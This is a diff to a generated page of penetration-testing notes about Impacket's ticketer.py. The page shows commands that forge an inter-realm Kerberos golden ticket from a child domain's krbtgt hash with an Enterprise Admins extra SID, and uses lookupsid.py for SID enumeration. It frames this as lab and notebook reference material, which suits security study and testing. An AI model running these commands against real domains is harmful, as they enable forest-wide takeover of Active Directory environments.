@@ -9,6 +9,33 @@ hideFooterPagination: true
 
 {/* Generated from Commands/ticketer.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## ticketer.py: choose the operation and read the result
+
+Commands and examples collected from your ticketer.py notes.
+
+### What the result establishes
+
+Inspect the ticket principal, realm, service, lifetime and encryption context before selecting it in a client.
+
+### Prerequisites and common failures
+
+Forged-ticket exercises require the correct key material and domain identifiers; a generated cache alone proves no access.
+
+### Example 1: Cross-domain / cross-forest
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+# child -> parent: forge an inter-realm TGT with the child krbtgt + SID history (sidHistory of Enterprise Admins)
+ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-519 -domain child.corp.local Administrator
+# intra-forest trust key abuse
+lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your ticketer.py notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=ticketer) · [All tools](/index)
 
 ## Cross-domain / cross-forest
@@ -21,6 +48,13 @@ ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <root_sid>-
 # intra-forest trust key abuse
 lookupsid.py $DOMAIN/USER:PASS@$DC       # get SIDs
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Trusts: Quick Reference — Cross-domain / cross-forest](/active-directory/domain-trusts#cross-domain-/-cross-forest) · [rpcclient: Users, Groups, and Domain Policy — Example 3: Cross-domain / cross-forest](/enumeration/rpcclient-cheat-sheet#example-3-cross-domain-/-cross-forest)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -57,6 +91,13 @@ Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corpo
 [*] Saving ticket in hacker.ccache
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Child to Parent Trusts - Linux — Constructing a Golden Ticket using ticketer.py](/active-directory/trusts-child-parent-linux#constructing-a-golden-ticket-using-ticketer-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Original captured examples">
@@ -81,6 +122,23 @@ ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   #
 smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Active Directory Trusts: Quick Reference](/active-directory/domain-trusts)
+- [Child to Parent Trusts - Linux](/active-directory/trusts-child-parent-linux)
+- [Impacket: Script Quick Reference](/tools/impacket)
+
+{/* VAULT_RELATED_END */}
